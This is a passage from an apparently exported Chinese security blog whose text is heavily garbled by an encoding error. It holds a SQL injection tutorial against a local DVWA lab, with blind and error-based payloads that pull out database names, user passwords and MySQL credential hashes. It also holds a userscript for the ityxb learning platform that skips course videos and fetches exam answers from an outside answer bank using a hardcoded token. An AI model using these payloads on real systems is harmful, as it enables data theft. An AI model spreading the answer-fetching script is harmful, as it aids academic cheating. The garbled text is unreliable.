å¦‚æœæˆªå–çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯â€˜dâ€™æˆ‘ä»¬è¿”å›1 å¦åˆ™è¿”å›0 æ­¤ç±»æ¨ã€‚å†åæ‹¼æ¥å­—ç¬¦å°±æ˜¯å®Œæ•´çš„åº“åã€‚ é»‘ç›’æƒ…å†µä¸‹è¿›è¡Œå¸ƒå°”ç›²æ³¨å…¥æ­¥éª¤ï¼š â€‹ æˆ‘ä»¬é¦–å…ˆéœ€è¦åˆ¤æ–­æ³¨å…¥æ˜¯å¦ä¸ºå¸ƒå°”æ³¨å…¥ï¼Œåˆ¤æ–­å®Œåå°±å¯ä»¥è·å–æ•°æ®åº“çš„é•¿åº¦ï¼Œå¾—åˆ°é•¿åº¦å†æŸ¥è¯¢åº“åï¼Œç„¶åæŸ¥è¯¢è¡¨åï¼Œå­—æ®µï¼Œå­—æ®µå†…å®¹ã€‚ã€‚ã€‚ å¸ƒå°”ç›²æ³¨å…¥æŸ¥è¯¢é•¿åº¦â€‹ é€šè¿‡æ„é€ å¦‚ä¸‹sqlè¯­å¥è¿›è¡Œæ•°æ®åº“é•¿åº¦çš„æŸ¥è¯¢ 11&#x27; and if(length(database())=4,1,0)-- åˆ¤æ–­å‡ºé•¿åº¦ä¸º4 å¸ƒå°”ç›²æ³¨å…¥åˆ¤æ–­åº“åè¿™ä¸€æ­¥æ“ä½œå…¶å®å°±æ˜¯é€šè¿‡éå† 10123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_ ä¸è¯­å¥è¿›è¡Œæ•´åˆåˆ¤æ–­å‡ºæ˜¯å¦è¿”å›1 11&#x27; and if(SUBSTRING(database(),1,1)=&#x27;$d&#x27;,1,0)-- å½“ç„¶äº†ï¼Œæˆ‘ä»¬æ‰‹åŠ¨è¿›è¡Œä¸€ä¸ªä¸€ä¸ªæµ‹è¯•è‚¯å®šå¾ˆæ…¢ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å€ŸåŠ©burpæ¥è¿›è¡Œå¦‚æ­¤æ“ä½œ å¸¦æœ‰æ„é€ sqlè¯­å¥çš„url 1http://192.168.18.137/01/vulnerabilities/sqli_blind/?id=1%27%20and%20if(SUBSTRING(database(),1,1)=%27d%27,1,0)--%20&amp;Submit=Submit# å†burpé‡Œé¢æŠ“åŒ…ç„¶åé€å…¥intruder å…ˆæ¸…é™¤å˜é‡ ç„¶åå†å°†æ•°å­—å’Œå­—æ¯è®¾ä¸ºå˜é‡ æ”»å‡»ç±»å‹é€‰æ‹© cluster bomb ç„¶åå°±æ˜¯payloadsé‡Œé¢ä¸¤ä¸ªå˜é‡çš„è®¾ç½® ç„¶åå¼€å§‹æ”»å‡»å°±è¡Œ è·‘å‡ºæ¥çš„çŠ¶æ€ç ä¸º200å³ä¸ºæˆåŠŸï¼ è·å¾—çš„æ•°æ®åº“åä¸º dvwa æ¥ç€æˆ‘ä»¬é€šè¿‡åº“åæ¥è·å–è¡¨å 11&#x27; and if(SUBSTRING((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1),1,1)=&#x27;g&#x27;,1,0)-- åŒæ ·é€šè¿‡burpè¿›è¡ŒæŠ“åŒ… è·å–åˆ°è¡¨åguestbook ç„¶åè·å–å­—æ®µå 11&#x27; and if(SUBSTRING((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 1,1),1,1)=&#x27;l&#x27;,1,0)-- åŒæ ·æˆ‘ä»¬ç”¨burpè¿›è¡Œçˆ†ç ´ å¾—åˆ°å­—æ®µåä¸ºlogin passwordç­‰ è·å¾—å®Œ å­—æ®µå æˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥è·å–å­—æ®µå†…å®¹ã€è´¦å·+å¯†ç ã€‘ 11&#x27; and if(SUBSTRING((select CONCAT(user,0x3a,PASSWORD) from users limit 1),1,1)=&#x27;a&#x27;,1,0)-- æŠ¥é”™æ³¨å…¥â€‹ é¡¾åæ€ä¹‰æŠ¥é”™æ³¨å…¥å°±æ˜¯æŒ‡æ•°æ®åº“æ˜¾ç¤ºé”™è¯¯ï¼Œæ¯”å¦‚sqlè¯­æ³•é”™è¯¯ ä¸€èˆ¬å¯¹äºphpã€‚ç‰¹åˆ«php åœ¨æ‰§è¡Œ SQL è¯­å¥æ—¶ä¸€èˆ¬éƒ½ä¼šé‡‡ç”¨å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œæ•è·é”™è¯¯ä¿¡æ¯ã€‚åœ¨ php ä¸­ ä½¿ç”¨ mysql_error()å‡½æ•° â€‹ å¦‚æœåœ¨æŸ¥è¯¢æ³¨å…¥æ—¶å€™ä¼šæœ‰æŠ¥é”™ä¿¡æ¯è¿”å›ï¼Œå¯ä»¥é‡‡ç”¨æŠ¥é”™æ³¨å…¥ æŠ¥é”™æ³¨å…¥åˆ†æ1234567891011121314151617181920212223242526&lt;?phpif( isset( $_REQUEST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input # getä¼ å…¥id å­—ç¬¦ä¸²å‹ $id = $_REQUEST[ &#x27;id&#x27; ]; // Check database # mysqli_error å‡½æ•°è¿”å›é”™è¯¯ä¿¡æ¯ $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);&#125;?&gt; æŠ¥é”™æ³¨å…¥æ”»å‡»â€‹ åœ¨è¾“å…¥æ¡†è¾“å…¥æŠ¥é”™çš„sqlæ‹¼æ¥è¯­å¥ 11&#x27; and info()-- å®ƒçš„åŸç†æ˜¯ä¸‹é¢ä¸€æ¡è¯­å¥ä¼šæ‰§è¡Œä½†æ˜¯ä¼šæŠ¥é”™ï¼Œåœ¨æŠ¥é”™ä¿¡æ¯ä¸­ä¼šè¿”å›æ•°æ®åº“åç§° 1SELECT first_name,last_name from users WHERE user_id=&#x27;1&#x27; and info() æŠ¥é”™æ³¨å…¥è·å–æ•æ„Ÿä¿¡æ¯â€‹ é€šè¿‡æ„é€ sqlè¯­å¥ï¼Œè¿”å›å¸¦æœ‰æ•°æ®åº“æ•æ„Ÿä¿¡æ¯çš„é”™è¯¯ä¿¡æ¯ 11&#x27; and (updatexml(1,concat(0x7e,(select user()),0x7e),1))-- æ³¨æ„ï¼šè¿™é‡Œä¸ºä»€ä¹ˆè¦ç”¨updatexml()å‘¢ï¼Œé¦–å…ˆè¦å…ˆäº†è§£è¿™ä¸ªå‡½æ•° updatexml(xml_doument,XPath_string,new_value)ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDocç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ï¼Œå¦‚æœä¸äº†è§£Xpathè¯­æ³•ï¼Œå¯ä»¥åœ¨ç½‘ä¸ŠæŸ¥æ‰¾æ•™ç¨‹ã€‚ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ® ç®€å•ç‚¹è¯´ï¼Œè¿™ä¸ªå‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬åˆ©ç”¨ç¬¬äºŒä¸ªå‚æ•°å¿…é¡»è¦æ›´æ”¹ä¿¡æ¯çš„xpathè¯­å¥æ¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥ã€‚ ä¸ºä»€ä¹ˆè¦åœ¨ç¬¬äºŒä¸ªå‚æ•°é‡Œé¢åŠ ä¸Šconcatè¯­å¥å‘¢ï¼Ÿå› ä¸ºupdatexmlï¼ˆï¼‰ç¬¬äºŒä¸ªå‚æ•°éœ€è¦è¿›è¡Œxpathæ ¡éªŒï¼Œå¦‚æœç¬¬äºŒä¸ªå‚æ•°å“ªé‡Œä¸æ˜¯xpathè¯­å¥å®ƒä¼šè¿›è¡Œä¸€æ¬¡æ ¡éªŒç„¶åæŠŠæ ¡éªŒåçš„é”™è¯¯ä¿¡æ¯è¿”å› ä½†æ˜¯é‡‡ç”¨ updatexml æŠ¥é”™å‡½æ•° åªèƒ½æ˜¾ç¤º 32 é•¿åº¦çš„å†…å®¹ï¼Œå¦‚æœè·å–çš„å†…å®¹è¶…è¿‡ 32 å­—ç¬¦å°±è¦é‡‡ç”¨å­—ç¬¦ä¸²æˆªå–æ–¹æ³•ã€‚æ¯æ¬¡è·å– 32 ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ã€‚ é™¤äº† updatexml å‡½æ•°æ”¯æŒæŠ¥é”™æ³¨å…¥å¤–ï¼Œmysql è¿˜æœ‰å¾ˆå¤šå‡½æ•°æ”¯æŒæŠ¥é”™ã€‚ ä¾‹å¦‚ï¼š 12345678910111213141516171819201.floor()select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2)) as x from information_schema.tables group by x)a);2.extractvalue()select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));3.updatexml()select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));4.geometrycollection()select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));5.multipoint()select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));6.polygon()select * from test where id=1 and polygon((select * from(select * from(select user())a)b));7.multipolygon()select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));8.linestring()select * from test where id=1 and linestring((select * from(select * from(select user())a)b));9.multilinestring()select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));10.exp()select * from test where id=1 and exp(~(select * from(select user())a)); åœ¨é»‘ç›’æ¨¡å¼ä¸‹è¿›è¡ŒæŠ¥é”™æ³¨å…¥â€‹ æµç¨‹è¿˜æ˜¯æ ¹ä¹‹å‰ä¸€æ · åº“å-ã€‹è¡¨å-ã€‹å­—æ®µ-ã€‹å­—æ®µå†…å®¹ è·å–åº“å11&#x27; and (updatexml(1,(select concat(&#x27;`&#x27;,(select database()),&#x27;`&#x27;)),1))-- è·å–è¡¨å è¿™æ¬¡ç”¨flooræŠ¥é”™ï¼ŒflooræŠ¥é”™ä¸ä¼šå‡ºç°é•¿åº¦é—®é¢˜11&#x27; and (select 1 from (select count(*),concat((select (select(select distinct concat(0x7e,table_name,0x7e) from information_schema.tables where table_schema=database() limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2)) as x from information_schema.tables group by x)a)-- è·å–è¡¨åä¸º guestbook å°†limit 0,1 æ”¹æˆ 1ï¼Œ1æ˜¯è·å–ç¬¬äºŒä¸ªè¡¨users è·å–å­—æ®µè·å–usersç¬¬ä¸€ä¸ªå­—æ®µ 11&#x27; and (select 1 from(select count(*),,)) è·å–è´¦å·å¯†ç  è·å–è´¦å·å’Œå¯†ç éœ€è¦rootæƒé™ 123select authentication_string from mysql.user limit 1;select(updatexml(1,concat(0x7e,(select (select authentication_string from mysql.user limit 1 )),0x7e),1))select(updatexml(1,concat(0x7e,(select (substring((select authentication_string from mysql.user limit 1),32,40))),0x7e),1))","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"http://blog.ioimp.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘å®‰","slug":"ç½‘å®‰","permalink":"http://blog.ioimp.top/tags/%E7%BD%91%E5%AE%89/"}]},{"title":"ğŸ˜ colincoraçš„ä¼ æ™ºæ’­å®¢å°åŠ©æ‰‹ ğŸ˜","slug":"ä¼ æ™ºæ’­å®¢è„šæœ¬åˆ¶ä½œ","date":"2022-08-17T09:08:35.000Z","updated":"2023-08-17T09:34:18.269Z","comments":true,"path":"2022/08/17/ä¼ æ™ºæ’­å®¢è„šæœ¬åˆ¶ä½œ/","link":"","permalink":"http://blog.ioimp.top/2022/08/17/%E4%BC%A0%E6%99%BA%E6%92%AD%E5%AE%A2%E8%84%9A%E6%9C%AC%E5%88%B6%E4%BD%9C/","excerpt":"","text":"ä»‹ç»è¿™æ˜¯ä¸€ä¸ªç”± colincora é­”æ”¹çš„ä¼ æ™ºæ’­å®¢å°åŠ©æ‰‹ï¼Œå…·å¤‡è‡ªåŠ¨è·³è§†é¢‘ã€è‡ªåŠ¨ç­”é¢˜ä»¥åŠå¯¹æ¥ä¸€ä¹‹é¢˜åº“çš„åŠŸèƒ½ã€‚ åŠŸèƒ½ç‰¹ç‚¹ ğŸ“º è‡ªåŠ¨è·³è§†é¢‘ï¼šå°åŠ©æ‰‹å¯ä»¥è‡ªåŠ¨è·³è¿‡å·²è§‚çœ‹çš„è§†é¢‘ï¼Œå¸®åŠ©ä½ èŠ‚çœæ—¶é—´ã€‚ ğŸ“ è‡ªåŠ¨ç­”é¢˜ï¼šå°åŠ©æ‰‹å¯ä»¥è‡ªåŠ¨å›ç­”ä¸€ä¹‹é¢˜åº“ä¸­çš„é¢˜ç›®ï¼Œè®©ä½ è½»æ¾é€šè¿‡è€ƒè¯•ã€‚ ğŸ“š å¯¹æ¥ä¸€ä¹‹é¢˜åº“ï¼šå°åŠ©æ‰‹ä¸ä¸€ä¹‹é¢˜åº“å¯¹æ¥ï¼Œå¯ä»¥è·å–æœ€æ–°çš„é¢˜ç›®å’Œç­”æ¡ˆï¼Œä¿è¯ä½ è·å–åˆ°å‡†ç¡®çš„ä¿¡æ¯ã€‚ ä½¿ç”¨æ–¹æ³• é¦–å…ˆï¼Œç¡®ä¿ä½ å·²ç»å®‰è£…äº† æµè§ˆå™¨æ²¹çŒ´è„šæœ¬ã€Tampermonkeyã€‘,å¹¶ä¸”å¤åˆ¶è„šæœ¬ä»£ç åˆ°æ–°å»ºè„šæœ¬ã€‚ æ‰“å¼€ä¼ æ™ºæ’­å®¢çš„å­¦ä¹ å¹³å°ï¼Œå¹¶ç™»å½•ä½ çš„è´¦å·ã€‚ åœ¨è§†é¢‘æ’­æ”¾é¡µé¢ï¼Œå¯åŠ¨å°åŠ©æ‰‹æ’ä»¶ã€‚ å°åŠ©æ‰‹ä¼šè‡ªåŠ¨æ£€æµ‹å½“å‰è§†é¢‘çš„è¿›åº¦ï¼Œå¹¶è·³è¿‡å·²è§‚çœ‹çš„éƒ¨åˆ†ã€‚ å½“é‡åˆ°é¢˜ç›®æ—¶ï¼Œå°åŠ©æ‰‹ä¼šè‡ªåŠ¨ä»ä¸€ä¹‹é¢˜åº“è·å–ç­”æ¡ˆï¼Œå¹¶å¡«å†™åœ¨ç­”é¢˜æ¡†ä¸­ã€‚ å®Œæˆæ‰€æœ‰é¢˜ç›®åï¼Œä½ å¯ä»¥ç»§ç»­è§‚çœ‹è§†é¢‘ï¼Œæˆ–è€…æ ¹æ®éœ€è¦è‡ªè¡Œæ“ä½œã€‚ æ³¨æ„äº‹é¡¹ æœ¬å°åŠ©æ‰‹ä»…ä¾›å­¦ä¹ å’Œå‚è€ƒä½¿ç”¨ï¼Œè¯·å‹¿ç”¨äºéæ³•ç”¨é€”ã€‚ ä½¿ç”¨æœ¬å°åŠ©æ‰‹å¯èƒ½è¿åä¼ æ™ºæ’­å®¢çš„ä½¿ç”¨è§„å®šï¼Œè¯·è‡ªè¡Œæ‰¿æ‹…é£é™©ã€‚ å¯¹æ¥ä¸€ä¹‹é¢˜åº“éœ€è¦æä¾›åˆæ³•çš„è´¦å·ä¿¡æ¯ï¼Œè¯·ç¡®ä¿ä½ çš„è´¦å·åˆæ³•æœ‰æ•ˆã€‚ å…è´£å£°æ˜æœ¬å°åŠ©æ‰‹ä»…ä¸ºä¸ªäººå¼€å‘é¡¹ç›®ï¼Œä¸å¯¹ä½¿ç”¨è¯¥è½¯ä»¶äº§ç”Ÿçš„ä»»ä½•é—®é¢˜è´Ÿè´£ã€‚ä½¿ç”¨æœ¬å°åŠ©æ‰‹å³ä»£è¡¨æ‚¨å·²ç»é˜…è¯»å¹¶åŒæ„è‡ªè¡Œæ‰¿æ‹…ä½¿ç”¨é£é™©ã€‚ è”ç³»æ–¹å¼å¦‚æœ‰ä»»ä½•é—®é¢˜æˆ–å»ºè®®ï¼Œæ¬¢è¿è”ç³» colincoraï¼š é‚®ç®±ï¼š&#51;&#x33;&#48;&#x30;&#53;&#49;&#57;&#x31;&#x36;&#49;&#64;&#x71;&#113;&#46;&#x63;&#111;&#x6d; å¾®ä¿¡ï¼šREMINAX è´¡çŒ®è€… colincora æ„Ÿè°¢æ‰€æœ‰ä¸ºè¿™ä¸ªé¡¹ç›®åšå‡ºè´¡çŒ®çš„äººï¼ æˆæƒè®¸å¯è¯¥é¡¹ç›®é‡‡ç”¨ MIT å¼€æºè®¸å¯è¯ã€‚è¯·æŸ¥é˜…è®¸å¯è¯æ–‡ä»¶ä»¥è·å–æ›´å¤šä¿¡æ¯ã€‚ ç¥ä½ å­¦ä¹ æ„‰å¿«ï¼ğŸ˜„ è„šæœ¬ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324// ==UserScript==// @name colincoraçš„ä¼ æ™ºæ’­å®¢å°åŠ©æ‰‹// @namespace *.com// @version 9.9.9// @description coliné­”æ”¹ è·³è§†é¢‘+è‡ªåŠ¨ç­”é¢˜ ä¸€åæ¥è‡ªä¿å®šå­¦é™¢æ»´å­¦ç”Ÿåˆ¶ä½œ Q3300519161// @author colincora// @match https://stu.ityxb.com/preview/detail/*// @namespace https://stu.ityxb.com/writePaper/busywork/*// @match https://stu.ityxb.com/writePaper/busywork/*// @match https://stu.ityxb.com/lookPaper/busywork/*// @grant GM_xmlhttpRequest// @grant GM_addStyle// @grant GM_log// @icon https://tch.ityxb.com/favicon.ico// ==/UserScript==var tibody;//é¢˜ç›®æ•°ç»„var total = 0;//é¢˜ç›®æ€»æ•°é‡var index = 0;//æœé¢˜ç´¢å¼•è‡ªåŠ¨å¢åŠ  let url = window.location.href;console.log(&#x27;æ¬¢è¿ä½¿ç”¨colincoraä¼ æ™ºæ’­å®¢å°åŠ©æ‰‹ï¼ä½œè€…QQ3300519161&#x27;); if(url.includes(&quot;https://stu.ityxb.com/preview/detail/&quot;))&#123; const courseName = document.querySelector(&#x27;p.course-name&#x27;);if (courseName) &#123; courseName.textContent = &#x27;&#x27;;&#125; console.log(&#x27;è¿™æ˜¯é¢„ä¹ ä½œä¸šç­”é¢˜éƒ¨åˆ†ï¼&#x27;); window.onload = function()&#123;// var bgdiv = document.getElementsByClassName(&quot;question-info-box&quot;);//bgdiv.style.background = &quot;url(&#x27;https://i.postimg.cc/BZKZRRtJ/20220508084230592.jpg&#x27;)&quot;;//tibody=document.getElementsByClassName(&quot;question-title-box&quot;);//total = tibody.length; // åˆ›å»ºä¸€ä¸ªæ–°çš„ div å…ƒç´  let newDiv = document.createElement(&quot;div&quot;); // ç»™å®ƒä¸€äº›å†…å®¹ let newContent = document.createTextNode(&quot;colincoraï¼Q3300519161&quot;); // æ·»åŠ æ–‡æœ¬èŠ‚ç‚¹ åˆ°è¿™ä¸ªæ–°çš„ div å…ƒç´  newDiv.appendChild(newContent); newDiv.style.position=&#x27;fixed&#x27;; newDiv.style.backgroundColor=&#x27;red&#x27; // newDiv.style.width=&#x27;20px&#x27;; // newDiv.style.length=&#x27;20px&#x27;; newDiv.style.fontSize=&#x27;28px&#x27;; // document.querySelector(&quot;#beginHeaderNav&quot;).appendChild(newDiv); newDiv.style.top=&#x27;60px&#x27;; &#125;function zhongzhuan()&#123; var bgdiv = document.getElementsByClassName(&quot;question-info-box&quot;); tibody=document.getElementsByClassName(&quot;question-title-box&quot;); console.log(tibody) total = tibody.length; kaishi(tibody[index]);&#125;function kaishi(ti)&#123; let text=document.getElementsByClassName(&quot;question-title-box&quot;)[0].innerText.substring(4);console.log(text); GM_xmlhttpRequest(&#123;//æ²¹çŒ´è„šæœ¬æä¾›çš„å¼‚æ­¥å‡½æ•° method: &#x27;POST&#x27;, url: &#x27;http://cx.icodef.com/wyn-nb?v=4&#x27;,//ç½‘è¯¾æ¥å£ headers: &#123; &#x27;Content-type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;, &#x27;Authorization&#x27;: &#x27;NLUIeWEHQHBAapeH&#x27; &#125;, data: &#x27;question=&#x27;+ encodeURIComponent(document.getElementsByClassName(&quot;question-title-box&quot;)[0].innerText.substring(4)), timeout: 2000, onload:function(xhr) &#123;//è‡ªåŠ¨é€‰æ‹©ç­”æ¡ˆ let json=JSON.parse(xhr.responseText); let daan=json.data;if(json.code==-1)daan=&quot;ç­”æ¡ˆæœªæ‰¾åˆ°&quot;; console.log(xhr.responseText);let answerarray=daan.split(&#x27;#&#x27;);//ç­”æ¡ˆæ•°ç»„ console.log(&#x27;ç­”æ¡ˆæ•°ç»„ï¼š&#x27;+answerarray)let daanlength=ti.getElementsByClassName(&quot;radio_item question-option-item-box&quot;).length;//å¤šå°‘ä¸ªé€‰é¡¹for(let i=0;i&lt;daanlength;i++)&#123; for(let i2=0;i2&lt;answerarray.length;i2++) &#123; // console.log(ti.getElementsByClassName(&quot;radio_item question-option-item-box&quot;)[i].innerText.split(&#x27;ã€&#x27;)[1]); if(ti.getElementsByClassName(&quot;radio_item question-option-item-box&quot;)[i].innerText.split(&#x27;ã€&#x27;)[1]==answerarray[i2])ti.getElementsByClassName(&quot;radio_item question-option-item-box&quot;)[i].firstElementChild; &#125;&#125;//æ˜¾ç¤ºç­”æ¡ˆ let newdaan=&#x27; &#x27;;for(let i=0;i&lt;answerarray.length;i++) &#123; newdaan=newdaan+&#x27;&lt;br&gt;&#x27;+answerarray[i]; &#125; var text = document.querySelector(&#x27;.question-title-text&#x27;); text.innerHTML=document.getElementsByClassName(&quot;question-title-text&quot;)[0].innerHTML+ &quot;&lt;br&gt;ç­”æ¡ˆ:&quot;+newdaan; console.log(newdaan) text.style.color = &quot;red&quot;;text.style.fontSize = &quot;10px&quot;; if(index &lt; total - 1)//ç»§ç»­æœç´¢æ¥ä¸‹æ¥çš„é¢˜ &#123; setTimeout(function ()&#123; index = index + 1; kaishi(tibody[index]);&#125;, 1000); &#125; &#125; &#125;) &#125;(function() &#123; &#x27;use strict&#x27;;function skipp()&#123; const videos = document.getElementsByTagName(&#x27;video&#x27;) if (videos.length &gt; 0) &#123; for (const video of videos) &#123; video.play() video.currentTime = video.duration - 1 &#125;&#125;&#125;function skip() &#123; const progressBoxes = document.querySelectorAll(&#x27;span.point-progress-box&#x27;); for (const box of progressBoxes) &#123; if (box.innerHTML === &quot;100%&quot;) &#123; continue; &#125; else if (box.innerHTML === &quot;0%&quot;) &#123; const playIcons = box.parentElement.querySelectorAll(&#x27;i.icon-circle.play-ico&#x27;); if (playIcons.length &gt; 0) &#123; playIcons.forEach(function(icon) &#123; icon.click(); &#125; ); &#125; &#125; skipp(); &#125;&#125;function addAutoSkipBtn() &#123; var autoSkipBtn = document.createElement(&quot;input&quot;); autoSkipBtn.setAttribute(&quot;type&quot;, &quot;button&quot;); autoSkipBtn.setAttribute(&quot;value&quot;, &quot;å¼€å¯è‡ªåŠ¨è·³è¿‡è§†é¢‘&quot;); autoSkipBtn.setAttribute(&quot;class&quot;, &quot;autoSkipBtn&quot;); autoSkipBtn.addEventListener(&quot;click&quot;, toggleAutoSkip); document.getElementsByClassName(&quot;course-name&quot;)[0].appendChild(autoSkipBtn); var div = document.querySelector(&#x27;.course-name&#x27;); div.insertAdjacentHTML(&#x27;afterend&#x27;, &#x27;&lt;a class=&quot;button&quot;&gt;æŸ¥çœ‹ç­”æ¡ˆ&lt;/a&gt;&#x27;); document.querySelector(&#x27;.button&#x27;).onclick = function () &#123; zhongzhuan(); &#125;&#125;function toggleAutoSkip() &#123; var autoSkipBtn = document.querySelector(&quot;.autoSkipBtn&quot;); if (autoSkipBtn.getAttribute(&quot;value&quot;) == &quot;å¼€å¯è‡ªåŠ¨è·³è¿‡è§†é¢‘&quot;) &#123; autoSkipBtn.setAttribute(&quot;value&quot;, &quot;å…³é—­è‡ªåŠ¨è·³è¿‡è§†é¢‘&quot;); skip1() &#125; else &#123; autoSkipBtn.setAttribute(&quot;value&quot;, &quot;å¼€å¯è‡ªåŠ¨è·³è¿‡è§†é¢‘&quot;); &#125;&#125;addAutoSkipBtn();function skip1() &#123; setInterval(function() &#123; skip(); &#125;, 3000);&#125;;&#125;)(); &#125;else&#123;window.onload = function()&#123; var bgdiv = document.getElementById(&quot;writeQuestion&quot;);//bgdiv.style.background = &quot;url(&#x27;https://i.postimg.cc/BZKZRRtJ/20220508084230592.jpg&#x27;)&quot;;tibody=document.getElementsByClassName(&quot;questionItem question-item-box&quot;);total = tibody.length; console.log(tibody[index]);kaishi(tibody[index]);//ä¼ å…¥æ¯é“é¢˜ // åˆ›å»ºä¸€ä¸ªæ–°çš„ div å…ƒç´  let newDiv = document.createElement(&quot;div&quot;); // ç»™å®ƒä¸€äº›å†…å®¹ let newContent = document.createTextNode(&quot;colincoraï¼Q3300519161&quot;); // æ·»åŠ æ–‡æœ¬èŠ‚ç‚¹ åˆ°è¿™ä¸ªæ–°çš„ div å…ƒç´  newDiv.appendChild(newContent); newDiv.style.position=&#x27;fixed&#x27;; newDiv.style.backgroundColor=&#x27;red&#x27; // newDiv.style.width=&#x27;20px&#x27;; // newDiv.style.length=&#x27;20px&#x27;; newDiv.style.fontSize=&#x27;28px&#x27;; document.querySelector(&quot;#beginHeaderNav&quot;).appendChild(newDiv); newDiv.style.top=&#x27;60px&#x27;; &#125;function kaishi(ti)&#123; GM_xmlhttpRequest(&#123;//æ²¹çŒ´è„šæœ¬æä¾›çš„å¼‚æ­¥å‡½æ•° method: &#x27;POST&#x27;, url: &#x27;http://cx.icodef.com/wyn-nb?v=4&#x27;,//ç½‘è¯¾æ¥å£ headers: &#123; &#x27;Content-type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;, &#x27;Authorization&#x27;: &#x27;NLUIeWEHQHBAapeH&#x27; &#125;, data: &#x27;question=&#x27;+ encodeURIComponent(ti.getElementsByClassName(&quot;question-title-box&quot;)[0].innerText), timeout: 2000, onload:function(xhr) &#123;//è‡ªåŠ¨é€‰æ‹©ç­”æ¡ˆ let json=JSON.parse(xhr.responseText); let daan=json.data;if(json.code==-1)daan=&quot;ç­”æ¡ˆæœªæ‰¾åˆ°&quot;;// console.log(xhr.responseText.code);let answerarray=daan.split(&#x27;#&#x27;);//ç­”æ¡ˆæ•°ç»„let daanlength=ti.getElementsByClassName(&quot;radio_item question-option-item-box&quot;).length;//å¤šå°‘ä¸ªé€‰é¡¹for(let i=0;i&lt;daanlength;i++)&#123; for(let i2=0;i2&lt;answerarray.length;i2++) &#123; // console.log(ti.getElementsByClassName(&quot;radio_item question-option-item-box&quot;)[i].innerText.split(&#x27;ã€&#x27;)[1]); //if(ti.getElementsByClassName(&quot;radio_item question-option-item-box&quot;)[i].innerText.split(&#x27;ã€&#x27;)[1]==answerarray[i2])ti.getElementsByClassName(&quot;radio_item question-option-item-box&quot;)[i].firstElementChild.click(); &#125;&#125;//æ˜¾ç¤ºç­”æ¡ˆ let newdaan=&#x27; &#x27;;for(let i=0;i&lt;answerarray.length;i++) &#123; newdaan=newdaan+&#x27;&lt;br&gt;&#x27;+answerarray[i]; &#125; ti.getElementsByClassName(&quot;question-title-box&quot;)[0].innerHTML += &quot;&lt;br&gt;ç­”æ¡ˆ:&quot;+newdaan; ti.getElementsByClassName(&quot;question-title-box&quot;)[0].style.color = &quot;red&quot;; ti.getElementsByClassName(&quot;question-title-box&quot;)[0].style.fontSize = &quot;10px&quot;; if(index &lt; total - 1)//ç»§ç»­æœç´¢æ¥ä¸‹æ¥çš„é¢˜ &#123; setTimeout(function ()&#123; index = index + 1; kaishi(tibody[index]);&#125;, 1000); &#125; &#125; &#125;) &#125;(function() &#123; &#x27;use strict&#x27;;&#125;)(); &#125;GM_addStyle(`.button &#123; background: #eb94d0 !important; /* åˆ›å»ºæ¸å˜ */ background-image: -webkit-linear-gradient(top, #eb94d0, #2079b0); background-image: -moz-linear-gradient(top, #eb94d0, #2079b0); background-image: -ms-linear-gradient(top, #eb94d0, #2079b0); background-image: -o-linear-gradient(top, #eb94d0, #2079b0); background-image: linear-gradient(to bottom, #eb94d0, #2079b0); /* ç»™æŒ‰é’®æ·»åŠ åœ†è§’ */ 